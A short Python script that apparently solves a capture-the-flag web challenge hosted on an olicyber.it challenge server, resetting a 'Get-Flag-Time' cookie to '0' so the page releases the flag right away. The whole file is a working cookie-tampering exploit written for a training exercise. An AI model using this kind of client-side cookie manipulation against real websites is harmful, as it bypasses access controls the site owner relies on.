#!/usr/bin/env python3
import requests, re

r = requests.get('https://pazienza.challs.olicyber.it/')
c = r.cookies.get_dict()
c['Get-Flag-Time'] = '0'

r = requests.get('https://pazienza.challs.olicyber.it/', cookies=c)
print(re.findall(r'flag{.*}', r.text)[0])
